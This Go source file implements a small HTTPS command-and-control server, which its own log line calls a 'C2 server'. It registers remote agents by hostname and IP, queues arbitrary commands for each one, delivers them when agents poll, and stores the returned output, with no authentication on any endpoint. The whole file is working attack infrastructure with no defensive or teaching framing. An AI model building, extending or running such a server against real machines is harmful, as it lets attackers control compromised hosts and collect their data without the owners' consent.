package main

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

// --------------------
// Data Models
// --------------------

type Agent struct {
	ID       string    `json:"id"`
	Hostname string    `json:"hostname"`
	IP       string    `json:"ip"`
	LastSeen time.Time `json:"last_seen"`
}

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type Result struct {
	AgentID string `json:"agent_id"`
	TaskID  string `json:"task_id"`
	Output  string `json:"output"`
}

// --------------------
// In-memory Storage
// --------------------

var (
	agents  = make(map[string]Agent)
	tasks   = make(map[string][]Task)
	results = make([]Result, 0)
	mutex   sync.Mutex
)

// --------------------
// Handlers
// --------------------

func registerAgentHandler(w http.ResponseWriter, r *http.Request) {
	var agent Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	mutex.Lock()
	defer mutex.Unlock()

	agentID := uuid.New().String()
	agent.ID = agentID
	agent.LastSeen = time.Now()
	agents[agentID] = agent

	log.Printf("[+] Registered agent %s (%s)", agentID, agent.Hostname)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agent)
}

func getTasksHandler(w http.ResponseWriter, r *http.Request) {
	agentID := mux.Vars(r)["agentID"]

	mutex.Lock()
	defer mutex.Unlock()

	agentTasks := tasks[agentID]
	tasks[agentID] = []Task{} // Clear the task queue

	log.Printf("[>] Agent %s pulled %d task(s)", agentID, len(agentTasks))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentTasks)
}

func postTaskHandler(w http.ResponseWriter, r *http.Request) {
	var task struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid task", http.StatusBadRequest)
		return
	}

	mutex.Lock()
	defer mutex.Unlock()

	newTask := Task{
		ID:      uuid.New().String(),
		Command: task.Command,
	}
	tasks[task.AgentID] = append(tasks[task.AgentID], newTask)

	log.Printf("[*] Added task %s to agent %s", newTask.ID, task.AgentID)
	w.WriteHeader(http.StatusCreated)
}

func postResultHandler(w http.ResponseWriter, r *http.Request) {
	var result Result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}

	mutex.Lock()
	defer mutex.Unlock()

	results = append(results, result)
	log.Printf("[✓] Received result for task %s from agent %s", result.TaskID, result.AgentID)
	w.WriteHeader(http.StatusCreated)
}

// --------------------
// Main Server Logic
// --------------------

func main() {
	r := mux.NewRouter()

	r.HandleFunc("/register", registerAgentHandler).Methods("POST")
	r.HandleFunc("/tasks/{agentID}", getTasksHandler).Methods("GET")
	r.HandleFunc("/tasks", postTaskHandler).Methods("POST")
	r.HandleFunc("/results", postResultHandler).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	log.Println("[*] C2 server listening on https://localhost:443")
	err := server.ListenAndServeTLS("server.crt", "server.key")
	if err != nil {
		log.Fatal(err)
	}
}
